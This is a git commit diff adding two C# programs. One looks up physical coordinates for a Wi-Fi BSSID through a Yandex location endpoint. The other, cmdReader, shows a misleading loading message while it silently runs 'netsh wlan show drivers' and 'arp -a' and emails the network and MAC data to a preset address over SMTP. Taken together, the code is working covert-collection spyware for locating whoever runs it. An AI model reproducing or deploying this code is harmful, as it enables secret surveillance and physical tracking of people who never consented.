77df8e55aa647309bf9993174f6802f7f4b5b7af
Александр <Neogara519@gmail.com>
2017-12-27 21:08:22 +0300

    Добавьте файлы проекта.

---
+++ BssidToLocation/MainWindow.xaml.cs
@@ -0,0 +1,47 @@
+﻿using System;
+using System.Text;
+using System.Windows;
+using System.Net;
+using System.Xml;
+
+namespace BssidToLocation
+{
+    /// <summary>
+    /// Логика взаимодействия для MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public MainWindow()
+        {
+            InitializeComponent();
+
+            Uri uri = new Uri(@"https://yandex.ru/maps/");
+            Web.Source = uri;
+        }
+
+        private void FindLocation_Click(object sender, RoutedEventArgs e)
+        {
+            string bssid = BssidText.Text.Trim();
+            bssid = bssid.Replace("-", "");
+
+            var url =
+            "http://mobile.maps.yandex.net/cellid_location/?clid=1866854&lac=-1&cellid=-1&operatorid=null&countrycode=null&signalstrength=-1&wifinetworks=" +
+            bssid +
+            ":-65&app=ymetro";
+            
+            WebClient wc = new WebClient();
+            wc.Encoding = Encoding.UTF8;
+            try
+            {
+                var strJson = wc.DownloadString(url);
+                var doc = new XmlDocument();
+                doc.Load(url);
+                LocationText.Text = doc.LastChild.FirstChild.Attributes[0].Value + " " + doc.LastChild.FirstChild.Attributes[1].Value;
+            }
+            catch (WebException ex)
+            {
+                MessageBox.Show("Something went wrong :( "+ex.Message+" )");
+            }
+        }
+    }
+}
---
+++ cmdReader/Program.cs
@@ -0,0 +1,66 @@
+﻿using System;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Mail;
+using System.Threading;
+
+namespace cmdReader
+{
+    class Program
+    {
+        public static void SendMsg(Object msg)
+        {
+            string message = (string)msg;
+
+            const string MailAddressFrom = "";      //enter data
+            const string MailPasswordFrom = "";     //enter data
+            const string MailAddressTo = "";        //enter data
+
+            using (MailMessage mm = new MailMessage("Bssid to location <" + MailAddressFrom + ">", MailAddressTo))
+            {
+                mm.Subject = "info ip";
+                mm.Body = message;
+                mm.IsBodyHtml = false;
+
+                //for sending I used yandex mail, if you need another please enter data from the mail you need
+                using (SmtpClient sc = new SmtpClient("smtp.yandex.ru", 25))
+                {
+                    sc.EnableSsl = true;
+                    sc.DeliveryMethod = SmtpDeliveryMethod.Network;
+                    sc.UseDefaultCredentials = false;
+                    sc.Credentials = new NetworkCredential(MailAddressFrom, MailPasswordFrom);
+                    sc.Send(mm);
+                };
+            };
+            Environment.Exit(0);
+        }
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Loading parammetrs...");
+            Process checkWlanProcess = new Process();
+            checkWlanProcess.StartInfo.UseShellExecute = false;
+            checkWlanProcess.StartInfo.RedirectStandardOutput = true;
+            checkWlanProcess.StartInfo.FileName = "netsh";
+            checkWlanProcess.StartInfo.Arguments = "wlan show drivers";
+            checkWlanProcess.Start();
+
+
+            Process checkLanProcess = new Process();
+            checkLanProcess.StartInfo.UseShellExecute = false;
+            checkLanProcess.StartInfo.RedirectStandardOutput = true;
+            checkLanProcess.StartInfo.FileName = "arp";
+            checkLanProcess.StartInfo.Arguments = "-a";
+            checkLanProcess.Start();
+
+            string wlanInfoOut = checkWlanProcess.StandardOutput.ReadToEnd();
+
+            string lanInfoOut = checkLanProcess.StandardOutput.ReadToEnd();
+
+            Thread myThread = new Thread(new ParameterizedThreadStart(SendMsg));
+            myThread.Start(wlanInfoOut + lanInfoOut);
+
+
+        }
+    }
+}
